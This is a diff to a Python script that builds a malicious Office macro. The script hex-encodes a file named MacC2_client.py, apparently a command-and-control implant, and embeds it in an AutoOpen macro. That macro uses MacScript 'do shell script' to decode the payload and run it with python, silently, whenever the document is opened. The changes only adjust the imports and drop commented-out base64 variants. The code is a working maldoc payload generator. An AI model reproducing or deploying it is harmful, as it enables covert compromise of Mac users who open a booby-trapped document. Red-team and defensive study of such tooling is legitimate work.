@@ -41,8 +41,6 @@ with open('MacC2_client.py', 'r') as file:
     data = file.read()
 
 data2 = binascii.hexlify(data.encode('utf-8'))
-#data2 = base64.b64encode(data.encode('utf-8'))
-#data3 = data2.decode('utf8')
 
 macrofile = open('macro.txt', 'w')
 macrofile.write('Sub AutoOpen()\n')
@@ -71,8 +69,7 @@ while totallength > 0:
         totallength = totallength - rowcount
         initializer = initializer + 1
  
-macro = "MacScript (\"do shell script \"\"\" & a & \" -c \\\"\"import base64,binascii,sys,socket,commands,os,ssl;\" & b & \"(binascii.unhexlify({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('\" & %s & \"')))\\\"\" &> /dev/null \"\"\")\n" % varname
-#macro = "MacScript (\"do shell script \"\"\" & a & \" -c \\\"\"import base64,sys,socket,commands,os,ssl;\" & b & \"(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('\" & info & \"')))\\\"\" &> /dev/null \"\"\")\n"
+macro = "MacScript (\"do shell script \"\"\" & a & \" -c \\\"\"import sys,socket,binascii,commands,os,ssl;\" & b & \"(binascii.unhexlify({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('\" & %s & \"')))\\\"\" &> /dev/null \"\"\")\n" % varname
 macrofile.write(macro)
 macrofile.write("End Sub\n")
 macrofile.close()
